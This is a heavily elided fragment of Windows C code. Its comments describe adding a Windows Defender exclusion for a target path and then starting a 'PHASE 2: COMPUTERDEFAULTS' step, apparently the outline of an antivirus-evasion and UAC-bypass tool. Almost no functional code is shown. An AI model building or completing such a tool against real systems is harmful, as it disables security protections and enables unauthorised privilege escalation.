...
#include <rpcndr.h>
#include <shlwapi.h>
#include <shlobj.h>  // Added for SHGetFolderPathW
...
int main() {
    ...
    // PARSE ARGS - Check for optional --path parameter
    ...
    // BUILD COMMAND - Exclude the target path in Defender
    ...
    CloseHandle((HANDLE)procInfo.ThreadHandle); 
    CloseHandle((HANDLE)procInfo.ProcessHandle);

    // PHASE 2: COMPUTERDEFAULTS
